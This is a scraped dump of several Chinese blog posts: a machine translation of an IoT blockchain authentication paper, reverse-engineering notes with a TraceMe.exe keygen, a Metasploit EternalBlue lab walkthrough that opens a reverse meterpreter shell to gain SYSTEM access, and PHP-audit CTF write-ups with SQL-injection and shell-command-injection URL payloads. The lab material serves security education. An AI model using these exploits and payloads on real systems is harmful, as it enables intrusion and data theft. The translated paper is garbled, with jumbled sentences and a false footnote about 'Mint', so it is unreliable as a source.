因此，物联网设备需要一种访问控制方法来保护设备免受单个用户的平台内身份验证以及未经授权的用户对设备的任意访问。 各种环境和各种物联网的服务平台 服务平台和平台应用程序服务[4-6]。 当前物联网环境中可能发生的安全问题 [3]。 已经开发出各种认证协议，直到 最近。 但是，大多数提议的身份验证协议都用于跟踪位置跟踪攻击的位置。 一个 重播攻击或欺骗攻击易受欺骗攻击 [3]。 许多网站都有弱点和侵犯隐私的行为。 研究人员 正在发现它[5]。 因此，这项研究工作提出了 基于区块链的对等身份验证方案 使用加密算法进行链接和保护。 每个块 具有哈希指针，通常作为指向前一个的符号链接 块，时间戳和交易数据[11]。 根据设计， 区块链固有地抗拒更改数据。 从技术上讲，区块链可以充当“一个开放的，分布式的分类帐，可以高效，可验证且永久地记录双方之间的交易”。 [12]用作 分散的分类帐，传统上，区块链由 对等网络节点共同遵守协议 用于验证新块。记录后，任何给定的数据 如果没有全部更改，则无法追溯更改块 随后的块和网络多数的冲突[13]。 区块链比非区块链算法更安全[26]。 但是，需要在性能和安全性之间进行权衡。 如果安全交易比效率更重要，那么 区块链是物联网通信的最佳解决方案。 其余研究组织如下。第二节 讨论无线方面一些当前存在的协议 传感器网络（WSN）第3和4节介绍了详细信息 提出的算法。第5节描述了结论 和未来的工作。 2 Related work2.1 Wireless sensor networksWSN可以广泛应用于实时等领域 交通监控，军事数据收集，地震活动 分散度测量和时间污染测量。 由于WSN由超小型传感器组成，因此存在一些限制，例如存储内存，计算量和能量 通讯半径。 提供安全的无线通信是一个非常重要的问题，因为传感器可能会暴露在恶劣的环境中，容易拦截无线 通讯，恶意攻击者可以篡改 消息或尝试重传攻击[10]。 安全的WSN通信的各个方面 研究。 WSN非常容易受到传感器节点（SN）的硬件设备以及节点检测，损坏，窃听， 拒绝服务攻击和路由攻击（例如，漏洞和蠕虫漏洞）取决于无线网络的特征[1]。 由于传感器节点的性质有限，因此不容易 应用现有的WSN安全技术。 因此， 正在研究加权密钥分发和认证方案，以实现消息等安全因素 完整性，机密性和节点身份验证。 应用轻量级公钥有两种方法 具有大量现有计算以适合 传感器节点和μ-TESLA（定时的“微型”版本， 高效，流式，容错认证协议） 和LEAP（轻量级可扩展身份验证协议） 低计算能力和安全密钥分发的SPINS（安全网络加密协议）[24]设计 [22]。 PIKE（密钥建立同行机构）[25]具有 提出了一种确保网络安全的密钥分配方案 基于对称密钥的安全性基于对称密钥的公开。 另外，不需要密钥的基于ID的方案 分布以及在消息传输频率上具有优势的问题也在研究中。 由于无线通信的本质，WSN的缺点是容易窃听消息[7]。 因此，为了防止这种情况，有必要通过加密和交换数据来确保机密性。 为了生成认证密钥，所有SN进行通信 直接与基站（BS）。 其实很难 与SN和BS直接通信。 如果能量有限的节点尝试通信 直接与远程BS进行通信，则能耗为 通过发送和接收身份验证消息而增加。 消耗这种能量的节点不能 长期参与交流[10]。 2.2 Light-weight sensor networks protocols有一些基于轻量级公钥的协议，并且 它们是由μ-TESLA[21]，LEAP [22]和SPINS [23]设计的 具有较低的计算能力和安全的密钥分发。 传感器节点在物联网环境中起着重要作用。 传感器 节点是物联网的关键。 因此，许多研究人员正在专注于 传感器节点的攻击承受能力和有效的通信 协议。 物联网存在一些问题，详细信息如下。 互联网基于ICT（互联网通信） 技术），这是一种智能环境，可在用户与对象之间以及对象与对象之间传递信息 通过连接工作。 美国市场研究公司Gartner 选择物联网作为最受关注的技术领域[8]。 物联网是 分为三大类：设备（终端/传感器） 区域，网络（有线/无线）区域和服务接口 （平台/应用程序）区域。 设备区域传输数据 从特定对象收集并提取到另一个对象 使用嵌入在对象中的通信功能。 网络区域是一个有线/无线通道，用于 传输/接收用户与 对象，对象到对象。 服务接口区域处理数据以生成信息，并控制和管理 各种设备。 2.3 Vulnerability on IoT虚假攻击是指攻击者伪装成 传感器网络中的合法服务器以及客户端 发出身份验证请求，继续执行协议， 非法获取传感器或传感器的认证密钥 用户。重传攻击是指在认证过程中，实体之间的认证过程中使用的组件 传感器网络将在后续的身份验证过程中存储和重用[9]。 身份验证密钥猜测攻击是对 攻击者窃听或伪装传感器网络中用户到传感器与传感器到传感器之间的身份验证过程，存储发送和接收的元素，并找到与最终商定的密钥相同的密钥 认证密钥[22]。 拒绝服务攻击是指攻击者进行的攻击 参与身份验证过程并拦截 即使传感器或用户请求身份验证也可以做出响应， 从而拒绝身份验证服务。 隐私侵害是一种侵犯隐私的行为，它通过从发送的元素中暴露出参与通信的主体 并在传感器上的身份验证过程中收到 网络。 2.4Attack model（攻击模型 ）本研究中的攻击模型可以是DoS攻击。 在DoS中 攻击，攻击者正试图逃避或冒充 通过发送伪装的假消息来合法的IoT设备 作为合法的物联网设备。 类似的情况可能在 点对点网络也是如此。 例如，合法的物联网 连接到其他物联网设备的节点设备，其中一些 可能是合法的，而其他人可能是恶意的。 这可能 最终导致网络拥塞并拒绝某些物联网 设备访问一些数据流。 问题是 将影响物联网设备的认证过程。 因此，与集中式系统相比，攻击者 正在处理所有都具有的物联网设备 区块链的当前状态。 因此，可以得出结论 DoS攻击很难通过对等网络进行，以损害整个网络的安全性 物联网数量众多导致网络和区块链 设备。 3 Blockchain-based sensor node authentication作者应该有足够的背景信息来 提供本文中所建议方法的更多接受 3.1 Blockchain因为任何参与使用区块链的人 可以输入，更改或删除数据，TTP（信任第三方） 不需要存在就可以在不诚实的网络各方之间进行交易。为了验证这种交易，使用共识算法，可以保证存储在其中的数据的可靠性 经过授权用户之间特定机制操作后的区块链。从而安全地更新和维护 区块链的状态，确保 区块链图1将电子硬币定义为 数字签名。每个成员将硬币转发到下一个 通过数字签名先前交易的哈希值和 下一个成员的公共密钥，将它们添加到 硬币。收款人可以验证签名以验证 成员资格[14]。区块链如图1所示。 当前块的值，数字签名，哈希值 对等网络。应用（2020）13：579–589 581 当前块，块标题和Merkle根以及块 数据由交易组成。 问题是收件人无法验证其中之一 业主不是双花硬币。常见的解决方案是 介绍一个可靠的中央机构，薄荷，交易 双重支出。每次交易后必须返回 硬币造币厂。 我们相信不会发行新硬币，只会发行硬币 由Mint1直接发行的将被重复使用。与问题 这个解决方案是整个瞬时系统的命运。 公司需要经营造币厂，并将其全部通过 交易通过银行进行。收件人以前没有签署过先前的会员交易。制作的唯一方法 确保没有涉及所有交易的交易。基于薄荷 模型，薄荷知道所有交易。我决定到达 第一。为了在没有可信任方的情况下实现这一目标，公开宣布了他们收到的订单。在每次交易时，大多数节点都同意这是第一次[14]。 构成区块链的区块由区块组成 标头和块体。块头包含哈希 前一个块标题的值，所有块都是 通过链表之类的链表方法连接起来，并且 包括用于共识的任意随机数 调整块生成难度的算法和位。块体可以具有不同的值，具体取决于 他们支持的服务。例如，在比特币中，数字 密码系统，用户之间发生的交易 块体中包含10分钟。区块链可能 成为公共区块链，私有区块链，财团 区块链可以分为三类[15]。每个块体 磷在结构上完全相似。但是，他们 具有不同的概念和功能，并且在每个区块链上定义和实现也有先决条件。 公共区块链是用于普遍使用的区块链 被称为比特币，以及私有区块链或财团 区块链是将区块链用于其他方面的概念 目的。 3.2 Conventional IoT sensor nodes authentication types在物联网环境中，攻击者伪装成物联网 具有各种攻击（例如攻击，重用攻击， 和DoS攻击被允许访问内部 物联网环境。 在现有的物联网环境中，有五种不同的 身份验证协议的类型。 表1显示了优点 每种认证技术的利弊[15]。 3.2.1 ID-based authentication基于ID的身份验证通过使用用户的电子邮件地址，名称，IP地址提供数字签名和身份验证 作为公钥密码系统。 预分配的密钥不是 需要。 计算量小，密钥长度为 比较短。 但是，它容易受到ID欺骗攻击的攻击。 有赫斯算法，林恩算法，绅士 图1交易中的区块链 1 Mint是基于Debian和Ubuntu的Linux发行版，很容易 采用。 582对等网络 应用 （2020）13：579–589 和Silverberg的算法，以及各种身份验证 方案[15]。 3.2.2 Certificate-based authentication一种使用数字签名进行认证的方法 公钥密码系统，将用于电子签名的信息记录在证书中，并根据该信息执行身份验证。 在韩国，有关 已通过《数字签名法》准备了发行系统和授权证书的管理 成立于1999年，并颁发了证书 由根CA进行最高级别的认证 机构通过五个授权的认证机构。 在外面 在整个国家，Verisign的设备认证服务包括 个人设备，电缆调制解调器设备认证，以及 WiMAX行业认证。 另外，基于证书 身份验证技术正在VoIP，网络监控摄像头等中使用，并且该领域正在逐步扩大。 基于证书的身份验证技术提供了很高的 通过强大的身份验证功能实现安全性并提供不可否认性。 但是，设备证书处理 软件和算法需要很高的计算吞吐量。 因此，它不适合用于低功耗，低性能的物联网设备。 3.2.3 Cryptography protocol based3.2.4 MAC address based authentication3.2.5 ID/password-based authentication4 Proposed P2P networking based IoT sensor authentication by Blockchain4.1 Requirements4.2 Device authentication method4.3 Hacking scenario on IoT authentication4.3.1 Jamming attack assumption4.4 Proposed IoT authentication by Blockchain4.5 Proposed IoT multiple-level node authentication model5 Conclusions","categories":[],"tags":[{"name":"translation","slug":"translation","permalink":"https://singlemindedt.github.io/tags/translation/"}]},{"title":"简单逆向","slug":"简单逆向","date":"2020-05-11T08:32:31.000Z","updated":"2020-05-14T17:03:28.570Z","comments":true,"path":"2020/05/11/简单逆向/","link":"","permalink":"https://singlemindedt.github.io/2020/05/11/简单逆向/","excerpt":"","text":"程序一、字节序程序源码12345678910111213#include\"windows.h\"BYTE b=0x12; WORD w=0x1234;DWORD dw=0x123456; char str[]=\"abcde\";int main() &#123; byte lb=b; WORD lw=w; DWORD ldw=dw; char *lstr=str; return 0; &#125; +++ 补充小端序（ Littie endian）：低地址存放低字节，高地址存放高字节，符合人类思维（地址0x100处，存储整数0x01234567） 地址 … 0x100 0x101 0x102 0x103 … 值 … 0x67 0x45 0x23 0x01 … 大端序（Big endian）:低地址存放高字节，高地址存放低字节 地址 … 0x100 0x101 0x102 0x103 … 值 … 0x01 0x23 0x45 0x67 … +++ 代码分析 TYPE Name SIZE 大端序类型 小端序类型 BYTE b 1 12 12 WORD w 2 12 34 34 12 DWORD dw 4 12 34 [56] [78] [78] [56] 34 12 char[] str 6 [61] [62] [63] [64] [65] [00] [61] [62] [63] [64] [65] [00] 对于char[]字符数组，在内存中连续，不管大端序还是小端序，存储顺序都是一样的 x86系列CPU是小端序； PowerPC是大端序; 网络协议也采用大端序（大端序也称网络字节序) +++ 调试 环境:x32dbg main函数汇编代码: 程序执行至0x4013EB leave时的程序栈: 相应的函数栈帧: ESP 0022FF40 00401920 lstr地址 0022FF44 00402008 ldw 0022FF48 00123456 b和w 0022FF4C 12FD1234 0022FF50 0000000A 0022FF54 00000002 EBP 0022FF58 0022FFF0 返回地址 0022FF5C 004010FD 寄存器状态，EAX=0表示return 0语句 +++ 程序二、栈的脏数据程序源码123456789101112#include&lt;stdio.h&gt;void f1()&#123; int a=1,b=2,c=3;&#125;void f2()&#123; int a,b,c; printf(\"a=%d,b=%d,c=%d\\n\",a,b,c);&#125;int main()&#123; f1(); f2();&#125; +++[3]:() +++ 补充函数栈退出以后，原有栈空间里的局部变量不会被自动清除，成为栈的噪音或脏数据。+++ 调试 环境:x32dbg f1(),f2()汇编代码: 当程序执行至0x4013CB leave（f1()函数对应参数均已入栈）时，对应栈布局: 相应的函数栈帧: ESP 0022FF38 0022FFF0 c 0022FF3C 00000003 b 0022FF40 00000002 a 0022FF44 00000001 EBP 0022FF48 0022FF58 返回地址 0022FF4C 00401406 当程序运行至0x4013F4（f2()函数参数均已入栈）时，此时栈布局: 对应的函数栈帧： ESP（printf第一个参数） 0022FF20 00403064 f2 a 0022FF24 00000003 f2 b 0022FF28 0022FFF0 f2 c 0022FF2C 00401950 0022FF30 77C04E42 0022FF34 00401950 0022FF38 0022FFF0 f1 c 0022FF3C 00000003 f1 b 0022FF40 00000002 f1 a 0022FF44 00000001 EBP 0022FF48 0022FF58 返回地址 0022FF4C 0040140B +++ 程序三、关于AT&amp;T和Intel程序源码12345678910#include&lt;stdio.h&gt;int main()&#123; int i; for(i=0;i&lt;10;i++) &#123; printf(\"Hello,World\\n\"); &#125; return 0;&#125; 在kali里创建test0.c文件； AT&amp;T语法 Intel语法+++ 程序四、linux下64，32程序源码123456789101112#include&lt;stdio.h&gt;void test_function(int a,int b,int c,int d)&#123; int flag; char buffer[10]; flag=31337; buffer[0]='A';&#125;int main()&#123; test_function(1,2,3,4);&#125; +++ 64位版本，可看出main函数中1,2,3,4分别存储在寄存器edi,esi,edx,ecx中；test_function函数中通过上述四个寄存器将值存储在栈中; [11]:()+++ 执行至0x55555555515b处,即test_function函数； 进入test_function函数内部； 执行至pop操作处： 此时的栈： 对应的栈帧如下表： rsp e1b0 0x00007fffffffe1c0 e1c0 0x0000555555555170 最后一字节为buffer0 e1d0 0x0000000000000000 e1e0 0x0000000100040000 rbp e1f0 0x0000000000000000 +++ 程序5、TraceMe.exe汇编代码根据GetDlgItemTextA函数找到程序的关键代码处： 输入用户名1234567,序列号08173144; 发现eax保存序列号长度，ebx保存用户名长度: test al,al判断用户名第一字节是否为空，空的话跳转。 分析后得知0X0040138F为跳转判断是否输入正确，如下代码： 可以直接按照00401347——00401378写出注册机； +++ 序列号生成算法： 123456789101112131415161718#include&lt;iostream&gt;#include&lt;string.h&gt;using namespace std;int main()&#123; char s[15]; cin&gt;&gt;s; char arr[]=&#123;0x0c,0x0a,0x13,0x09,0x0c,0x0b,0x0a,0x0b&#125;; int r=0; int len=strlen(s); for (int i=3,j=0;j&lt;len;i++,j++) &#123; if(j&gt;7) j=0; r+=s[i]*arr[j]; &#125; cout&lt;&lt;r;&#125; 还是以用户名1234567，得到序列号： Check: 成功！ +++ 程序六、调用stdcall、fastcall…1.stdcall示例代码： 12345678910#include&lt;stdio.h&gt;void __stdcall demo_cdecl(int x,int y,int z,int w)&#123; int sum=x+y+z+w;&#125;int main()&#123; demo_cdecl(1,2,3,4); return 0;&#125; +++ 汇编代码： x32dbg 被调用方调整栈帧： 2.fastcall示例代码： 12345678910#include&lt;stdio.h&gt;void __fastcall demo_cdecl(int x,int y,int z,int w)&#123; int sum=x+y+z+w;&#125;int main()&#123; demo_cdecl(1,2,3,4); return 0;&#125; +++ 汇编代码： 被调用方调整栈帧： +++ 3.cdecl示例代码： 12345678910#include&lt;stdio.h&gt;void __cdecl demo_cdecl(int x,int y,int z,int w)&#123; int sum=x+y+z+w;&#125;int main()&#123; demo_cdecl(1,2,3,4); return 0;&#125; +++ 汇编代码： 被调用方调整栈帧： +++ 4.thiscall示例代码： 1234567891011121314#include&lt;stdio.h&gt;class CSum&#123; public: int Add(int a,int b) &#123; return a+b; &#125; &#125;;int main()&#123; CSum sum; sum.Add(1,2);&#125; +++ 汇编代码： 被调用方调整栈帧： +++ 5.64位操作系统示例代码： 123456789#include&lt;stdio.h&gt;int Add(int n1,int n2,int n3,int n4,int n5,int n6)&#123; return n1+n2+n3+n4+n5+n6;&#125;int main()&#123; printf(\"%d\\r\\n\",Add(1,2,3,4,5,6));&#125; +++ Main函数： Add函数： +++ 6.64位gccmain函数，6个参数从左向右放入寄存器:rdi,rsi,rdx,rcx,r8,r9 Add函数： 7.虚函数调用实例代码： 12345678910111213141516171819#include&lt;stdio.h&gt;class CSum&#123; public: virtual int Add(int a,int b) &#123; return a+b; &#125; virtual int Sub(int a,int b) &#123; return a-b; &#125;&#125;;int main()&#123; CSum* pCSum=new CSum; pCSum-&gt;Add(1,2); pCSum-&gt;Sub(1,2);&#125; +++ Main函数汇编：","categories":[],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://singlemindedt.github.io/tags/逆向/"}]},{"title":"利用永恒之蓝获取meterpretershell","slug":"利用永恒之蓝获取meterpretershell","date":"2020-05-10T11:49:35.000Z","updated":"2020-05-11T08:24:25.408Z","comments":true,"path":"2020/05/10/利用永恒之蓝获取meterpretershell/","link":"","permalink":"https://singlemindedt.github.io/2020/05/10/利用永恒之蓝获取meterpretershell/","excerpt":"","text":"实验环境： 攻击机：Kali（192.168.40.128） 靶机：Win7（192.168.40.142） +++ 攻击过程： 开启msf 1msfconsole 情报搜集，首先确定目标是否开放445端口，漏洞Ms17-010是否存在 1nmap探测主机信息：nmap -sV 192.168.40.142 445端口开放，目的主机为windows7系统，推测存在ms17-010漏洞; 利用msf的辅助模块auxiliary进行漏洞验证 1search ms17-010 搜索相关漏洞模块得到5条结果，有远程Windows命令执行、远程Windows内核损坏、代码执行等，此处使用auxiliary/scanner/smb/smb_ms17_010 进行验证； 配置基本信息： 123use auxiliary/scanner/smb/smb_ms17_010set rhost 192.168.40.142set rport 445 运行探测漏洞是否存在： 1run 根据结果，存在该漏洞。 渗透攻击 使用渗透攻击（exploit）模块； 设置攻击目标地址+端口、本机地址 1use exploit/windows/smb/ms17_010_eternalblue 123set rhost 192.168.40.142set rport 445set lhost 192.168.40.128 设置payload 1set payload windows/x64/meterpreter/reverse_tcp 查看配置完整性 1show options 在Exploit targets中可看到win7和server 2008 r2都适用； 攻击 1run 可以看到，直接得到了靶机system权限，并给出了shell界面。 +++ 再回头看看我们的payload： 1set payload windows/x64/meterpreter/reverse_tcp 目的是进入meterpreter模式，但是结果并不是这样。检查配置后，发现原因： Metasploit中的扫描器和大部分的其他辅助模块使用RHOSTS选项而不是RHOST 将配置部分中rhost改为rhosts,开始攻击成功进入meterpreter模式： +++ 查看此用户权限 1meterpreter &gt; getuid 如图，已经获得NT AUTHORITY\\SYSTEM权限。 +++ Meterpreter: Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。 +++","categories":[],"tags":[{"name":"Demo","slug":"Demo","permalink":"https://singlemindedt.github.io/tags/Demo/"},{"name":"渗透","slug":"渗透","permalink":"https://singlemindedt.github.io/tags/渗透/"}]},{"title":"PHP-Audit-Labs","slug":"PHP-Audit-Labs","date":"2020-05-03T00:45:59.000Z","updated":"2020-05-10T09:03:01.301Z","comments":true,"path":"2020/05/03/PHP-Audit-Labs/","link":"","permalink":"https://singlemindedt.github.io/2020/05/03/PHP-Audit-Labs/","excerpt":"","text":"[红日安全]代码审计Day1 - in_array函数缺陷一、关于in_array 定义和用法 in_array() 函数搜索数组中是否存在指定的值。 注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。 语法 1in_array(search,array,type) | 参数 | 描述 || :——- | :———————————————————– || search | 必需。规定要在数组搜索的值。 || array | 必需。规定要搜索的数组。 || type | 可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。 | 来源：www.W3school.com.cn;[PHP手册](https://www.php.net/parse_url) 题目[day1-2]:()考察点： in_array绕过 使用拼接函数updatexml注入 +++ 1.in_array绕过关键代码： connect_error() (1)定义和用法 mysqli_connect_error() 函数返回上一次连接错误的错误描述。 (2)语法 mysqli_connect_error(); (3)细节 返回值： 返回一个描述错误的字符串。如果没有错误发生则返回 NULL。 PHP 版本： 5+ fetch_assoc() （1）定义和用法 mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组。 注释：该函数返回的字段名是区分大小写的。 （2）语法： mysqli_fetch_assoc(result); 参数 描述 result 必需。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果集标识符。 （3）细节： 返回值： 返回代表读取行的关联数组。如果结果集中没有更多的行则返回 NULL。 PHP 版本： 5+ +++ query() (1)定义和用法 mysqli_query() 函数执行某个针对数据库的查询。 (2)语法 mysqli_query(connection,query,resultmode); 参数 描述 connection 必需。规定要使用的 MySQL 连接。 query 必需，规定查询字符串。 resultmode 可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认） (3)细节 返回值： 针对成功的 SELECT、SHOW、DESCRIBE 或 EXPLAIN 查询，将返回一个 mysqli_result 对象。针对其他成功的查询，将返回 TRUE。如果失败，则返回 FALSE。 PHP 版本： 5+ 更新日志： 在 PHP 5.3.0 中新增了异步查询的功能。 +++ num_rows() (1)定义和用法 mysqli_num_rows() 函数返回结果集中行的数量。 (2)语法 mysqli_num_rows(result); 参数 描述 result 必需。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果集标识符。 (3)细节 返回值： 返回结果集中行的数量。 PHP 版本： 5+ +++ 分析：在index.php文件中，第11行的if条件语句处可以看出，程序把用户的ID值存储在 $whitelist 数组中，然后将用户传入的 id 参数先经过config.php文件中定义的stop_hack函数过滤，然后再用 in_array 来判断用户传入的 id 参数是否在 $whitelist 数组中，如果不在，返回 id $id is not in whitelist. 如果在，那么执行SQL语句，最后返回查询的内容。这里 in_array 函数没有使用强匹配，所以是可以绕过的，例如： id=1’ 是可以成功绕过 in_array 函数的。config.php文件中stop_hack函数，这是一个过滤函数，主要过滤了字符串拼接函数，导致我们没法直接通过union selct或者常见的hex()等方式来得到flag。 +++ 2. 使用拼接函数updatexml注入关于UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 注：Updatexml函数有个特性，当 updatexml 查询的数据中包含特殊字符或者字母，就会报错，报错信息为特殊字符、字母及之后的内容，如：查询的数据为99panda，那么结果只会显示panda。 因此这里通过查询database(),返回数据库名，然后CONCAT将其字符串化。因为UpdateXml第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。 由于字符串拼接函数被过滤了，因此无法使用concat等函数构造语句，只能选择使用不常用的函数——make_set()函数。 关于MAKE_SET(bits,str1,str2,…) 返回一个设定值(含子字符串分隔字符串”,”字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果。 参考：关于UPDATEXML和make_set()函数 因此，可构造本题的payload： 1http://localhost/index.php?id=4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1)) +++ [红日安全]代码审计Day2 -filter_var函数二、关于filter_var函数 定义和用法 filter_var() 函数通过指定的过滤器过滤变量。 如果成功，则返回已过滤的数据，如果失败，则返回 false。 语法 1filter_var(variable, filter, options) 参数 描述 variable 必需。规定要过滤的变量。(变量的值在过滤前，会被转换成字符串) filter 可选。规定要使用的过滤器的 ID。 options 规定包含标志/选项的数组。检查每个过滤器可能的标志和选项。 题目：12345678910111213141516171819202122// index.php&lt;?php $url = $_GET['url'];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match('/sec-redclub.com$/',$site_info['host']))&#123; exec('curl \"'.$site_info['host'].'\"', $result); echo \"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;\"; echo implode(' ', $result); &#125; else&#123; die(\"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;\"); &#125;&#125;else&#123; echo \"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;\";&#125;?&gt; +++ 1234// f1agi3hEre.php&lt;?php $flag = \"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;\"?&gt; 考察点： filter_var()绕过 远程命令执行 补充： exec() (PHP 4, PHP 5, PHP 7) exec — 执行一个外部程序; 说明： 1exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string exec() 执行 command 参数所指定的命令。 参数： command：要执行的命令； output：如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。 return_var:如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。 返回值 命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。 如果想要获取命令的输出内容， 请确保使用 output 参数。 +++ parse_url() (PHP 4, PHP 5, PHP 7) parse_url — 解析 URL，返回其组成部分。 说明 1parse_url ( string `$url` [, int `$component` = -1 ] ) : [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) 本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。 本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。 参数 url 要解析的 URL。无效字符将使用 _ 来替换。 component 指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、 PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为 PHP_URL_PORT 后，将返回一个 integer 的值）。 返回值 对严重不合格的 URL，parse_url() 可能会返回 FALSE。 如果省略了 component 参数，将返回一个关联数组 array，在目前至少会有一个元素在该数组中。数组中可能的键有以下几种： scheme - 如 http host port user pass path query - 在问号 ? 之后 fragment - 在散列符号 # 之后 如果指定了 component 参数， parse_url() 返回一个 string （或在指定为 PHP_URL_PORT 时返回一个 integer）而不是 array。如果 URL 中指定的组成部分不存在，将会返回 NULL。 参考：PHP手册 +++ preg_match (PHP 4, PHP 5, PHP 7) preg_match — 执行匹配正则表达式 说明 1preg_match ( string `$pattern` , string `$subject` [, array `&amp;$matches` [, int `$flags` = 0 [, int `$offset` = 0 ]]] ) : int 搜索subject与pattern给定的正则表达式的一个匹配. +++ implode (PHP 4, PHP 5, PHP 7) implode — 将一个一维数组的值转化为字符串 说明 implode ( string $glue , array $pieces ) : string implode ( array $pieces ) : string 用 glue 将一维数组的值连接为一个字符串。 Note:因为历史原因，implode() 可以接收两种参数顺序，但是 explode() 不行。不过按文档中的顺序可以避免混淆。 +++ 分析：通过GET方式得到url，并随后经过filter_var和parse_url函数过滤将值传给变量$site_info。程序使用 exec 函数来执行 curl 命令，规定当 url 参数的值以 sec-redclub.com 结尾时，才会执行 exec 函数。 首先构造payload绕过绕过 filter_var 的 FILTER_VALIDATE_URL 过滤器; 123http://localhost/index.php?url=demo://demo.com,sec-redclub.comORhttp://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/ 绕过 parse_url 函数，并且满足 $site_info[‘host’] 的值以 sec-redclub.com 结尾，payload如下： 1http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/ 参考绕过方法 当我们直接用 cat f1agi3hEre.php 命令的时候，过不了 filter_var 函数检测，因为包含空格，具体payload如下： 1http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/ +++ [红日安全]代码审计Day3 -实例化任意对象漏洞题目：12345678910111213141516171819202122// index.php&lt;?phpclass NotFound&#123; function __construct() &#123; die('404'); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';&#125; +++ 1234// f1agi3hEre.php&lt;?php$flag = \"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;\";?&gt; +++ 补充： __construct() __construct() 函数创建一个新的 SimpleXMLElement 对象。 如果成功，则该函数返回一个对象。如果失败，则返回 false。 +++ class_exists (PHP 4, PHP 5, PHP 7) class_exists — 检查类是否已定义 说明 class_exists ( string $class_name [, bool $autoload = true ] ) : bool 检查指定的类是否已定义。 参数 class_name 类名。名字的匹配是不分区大小写的。 autoload 是否默认调用 __autoload。 返回值 如果由 class_name 所指的类已经定义，此函数返回 TRUE，否则返回 FALSE。 +++ var_dump (PHP 4, PHP 5, PHP 7) var_dump — 打印变量的相关信息 说明 1var_dump ( mixed $expression [, mixed $... ] ) : void 此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 In PHP 5 all public, private and protected properties of objects will be returned in the output. Tip 和直接将结果输出到浏览器一样，可使用输出控制函数来捕获当前函数的输出，然后(例如)保存到一个 string 中。 参数 expression 你要打印的变量。 +++ foreach (PHP 4, PHP 5, PHP 7) foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法： 1234foreach (array_expression as $value) statementforeach (array_expression as $key =&gt; $value) statement 第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。 第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。 还能够自定义遍历对象。 +++ spl_autoload_register (PHP 5 &gt;= 5.1.0, PHP 7) spl_autoload_register — 注册给定的函数作为 __autoload 的实现 说明 spl_autoload_register ([ callable $autoload_function [, bool $throw = true [, bool $prepend = false 